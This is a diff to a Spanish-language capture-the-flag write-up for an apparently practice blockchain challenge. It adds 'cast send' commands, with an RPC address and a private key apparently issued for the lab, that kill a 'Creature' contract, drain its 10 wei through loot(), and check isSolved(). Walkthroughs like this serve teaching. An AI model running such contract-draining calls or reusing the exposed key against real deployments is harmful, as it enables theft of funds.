@@ -38,22 +38,47 @@ su vida a 0 y vaciar su balance (inicialmente con 10 wei), de modo que la funci�
 
 ![Captura de pantalla 2025-06-22 165903](https://github.com/user-attachments/assets/fdea670d-b208-486d-b12a-8d111ecadc63)
 Estoy usando cast send para enviar una transacción.
+
 ```
+cast send \
+  --rpc-url http://94.237.48.12:43003/rpc \
+  --private-key 0xbafd5876d4a4ac29bff3db7837c86f996c9322bacd734e0d242aaca015053a35 \
+  0x844e738D927Ae2F465fC69C69eD9A7EC1E0a3C4f \
+  "strongAttack(uint256)" 20
+```
+1. --rpc-url: Dirección RPC del nodo donde se corre el reto
+2. --private-key: Clave privada de tu wallet
+3. Dirección del contrato	Donde se envía la transacción (Creature o Setup)
+4. "strongAttack(uint256)" 20	Llama a strongAttack con 20 de daño para dejar al Creature con 0 vida.
 strongAttack(20) es una función del contrato Creature que reduce sus lifePoints en 20.
-```
+
 Como empieza con 20, al hacer esto queda con 0 vida.
 
 Al ejecutarlo, se guarda en el estado del contrato que la Creature está "muerto".
 
 ![Captura de pantalla 2025-06-22 170020](https://github.com/user-attachments/assets/e8819347-66e2-4072-9d11-be34fbe9a201)
 ```
-loot() está protegida por un require(lifePoints == 0) ~ solo puede llamarse si mataste al Creature.
+cast send \
+  --rpc-url http://94.237.48.12:43003/rpc \
+  --private-key 0xbafd5876d4a4ac29bff3db7837c86f996c9322bacd734e0d242aaca015053a35 \
+  0x844e738D927Ae2F465fC69C69eD9A7EC1E0a3C4f \
+  "loot()"
 ```
+1. "loot()"	Reclama el balance del contrato si su vida es 0
+
+loot() está protegida por un require(lifePoints == 0) ~ solo puede llamarse si mataste al Creature.
+
 Como ya lo hice, la función transfiere todo el balance del contrato (10 wei) a mi wallet.
 
 ![Captura de pantalla 2025-06-22 170152](https://github.com/user-attachments/assets/cc11db3f-39d8-49dc-842e-823d2fdde5f9)
+```
+cast call \
+  --rpc-url http://94.237.48.12:43003/rpc \
+  0x1e5B512Fe445d623446E7c5B114f4f4142c59AB3 \
+  "isSolved()"
+  ```
+ 
 Uso cast call (llamada de solo lectura) para consultar si el reto fue resuelto.
-
 El contrato Setup tiene una función isSolved() que devuelve true cuando el Creature tiene balance == 0.
 
 Como hice loot(), el contrato se quedó sin fondos, por lo tanto, devuelve 1 (que significa true).
